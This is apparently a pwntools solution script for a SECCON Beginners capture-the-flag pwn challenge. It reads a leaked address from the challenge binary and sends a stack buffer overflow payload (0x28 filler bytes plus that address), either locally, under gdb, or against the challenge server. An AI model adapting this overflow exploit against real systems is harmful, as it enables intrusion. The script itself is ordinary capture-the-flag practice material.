from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'pet-sound.challenges.beginners.seccon.jp'
POST = 9090
#libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''
  b main
  ''')
else:
  c = process(FILENAME)

c.recvuntil('is at: ')
flag_add = int(bytes.decode(c.recvline().replace(b'\n',b'')),16)
payload = b'a'*0x28
payload+= p64(flag_add)
c.send(payload)


c.interactive()